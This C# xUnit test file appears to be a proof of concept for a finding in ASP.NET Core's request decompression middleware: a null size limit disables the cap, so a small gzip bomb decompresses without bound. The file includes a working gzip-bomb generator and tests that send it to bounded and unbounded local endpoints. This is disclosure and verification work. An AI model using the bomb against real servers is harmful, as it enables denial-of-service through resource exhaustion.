using System.IO.Compression;
using System.Net;
using System.Net.Http.Headers;
using Microsoft.AspNetCore.Mvc.Testing;
using Xunit;
using Xunit.Abstractions;

namespace Decompression.Tests;

// Proof of finding: when an endpoint disables MaxRequestBodySize, RequestDecompressionMiddleware
// passes a null sizeLimit into SizeLimitedStream. Inside SizeLimitedStream.ReadAsync the check
// `_totalBytesRead > _sizeLimit` is a lifted nullable comparison -- per ECMA-334 it returns
// false whenever either operand is null. Result: the throw never fires and the stream is
// effectively unlimited, so a small gzipped payload that decompresses to a much larger size
// (a "decompression bomb") amplifies attacker bandwidth into server resource consumption with
// no framework-level cap.
//
// Defense the framework DOES provide: with MaxRequestBodySize set to a real value, the
// SizeLimitedStream throws BadHttpRequestException(413) at the cap. The bounded-endpoint test
// proves that path works.
public class DecompressionBombTests : IClassFixture<WebApplicationFactory<Program>>
{
    private readonly WebApplicationFactory<Program> _factory;
    private readonly ITestOutputHelper _out;

    public DecompressionBombTests(WebApplicationFactory<Program> factory, ITestOutputHelper output)
    {
        _factory = factory;
        _out = output;
    }

    // Build a gzip "bomb": N bytes of zeros, gzipped. zeroes are highly compressible
    // (~1024:1 ratio) so a small wire payload decompresses to a much larger one.
    private static byte[] MakeGzipBomb(int decompressedBytes)
    {
        var ms = new MemoryStream();
        using (var gz = new GZipStream(ms, CompressionLevel.Optimal, leaveOpen: true))
        {
            var chunk = new byte[64 * 1024]; // 64 KB of zeros at a time
            var remaining = decompressedBytes;
            while (remaining > 0)
            {
                var n = Math.Min(remaining, chunk.Length);
                gz.Write(chunk, 0, n);
                remaining -= n;
            }
        }
        return ms.ToArray();
    }

    private HttpClient CreateClient() => _factory.CreateClient(new WebApplicationFactoryClientOptions
    {
        AllowAutoRedirect = false,
    });

    [Fact] // Sanity: SizeLimitedStream's intended path. With a real size limit, decompression
    // amplification beyond the limit is correctly rejected with 413.
    public async Task BoundedEndpoint_rejects_decompression_bomb_with_413()
    {
        var bomb = MakeGzipBomb(decompressedBytes: 5 * 1024 * 1024); // 5 MB decompressed
        _out.WriteLine($"Compressed payload: {bomb.Length:N0} bytes (decompresses to 5 MB)");

        var content = new ByteArrayContent(bomb);
        content.Headers.ContentEncoding.Add("gzip");
        content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");

        var resp = await CreateClient().PostAsync("/upload-bounded", content);
        var body = await resp.Content.ReadAsStringAsync();
        _out.WriteLine($"Status: {(int)resp.StatusCode} {resp.StatusCode}");
        _out.WriteLine($"Body:   {body}");

        Assert.Equal(HttpStatusCode.RequestEntityTooLarge, resp.StatusCode);
    }

    [Fact] // THE PROOF: identical attack against the [DisableRequestSizeLimit] endpoint
    // succeeds. The endpoint reads the entire decompressed body without any size cap.
    public async Task UnboundedEndpoint_accepts_decompression_bomb_demonstrating_null_sizelimit_bypass()
    {
        const int Decompressed = 50 * 1024 * 1024; // 50 MB decompressed
        var bomb = MakeGzipBomb(Decompressed);
        _out.WriteLine($"Compressed payload: {bomb.Length:N0} bytes");
        _out.WriteLine($"Decompressed size:  {Decompressed:N0} bytes (~{(double)Decompressed / bomb.Length:F0}:1 amplification)");

        var content = new ByteArrayContent(bomb);
        content.Headers.ContentEncoding.Add("gzip");
        content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");

        var resp = await CreateClient().PostAsync("/upload-unbounded", content);
        var body = await resp.Content.ReadAsStringAsync();
        _out.WriteLine($"Status: {(int)resp.StatusCode} {resp.StatusCode}");
        _out.WriteLine($"Body:   {body}");

        // The bypass: 200 OK with the full decompressed body read. If the framework defended,
        // we'd see 413 here too. We don't.
        Assert.Equal(HttpStatusCode.OK, resp.StatusCode);
        Assert.Contains($"\"decompressedBytesRead\":{Decompressed}", body);
    }

    [Fact] // Quick contrast: same endpoints, no Content-Encoding header -> middleware skips
    // decompression entirely, behaviors of both endpoints are normal.
    public async Task UnboundedEndpoint_uncompressed_body_just_returns_byte_count()
    {
        var payload = new byte[1 * 1024 * 1024]; // 1 MB of zeros, uncompressed
        var content = new ByteArrayContent(payload);
        content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");

        var resp = await CreateClient().PostAsync("/upload-unbounded", content);
        var body = await resp.Content.ReadAsStringAsync();

        Assert.Equal(HttpStatusCode.OK, resp.StatusCode);
        Assert.Contains("\"decompressedBytesRead\":1048576", body);
    }
}
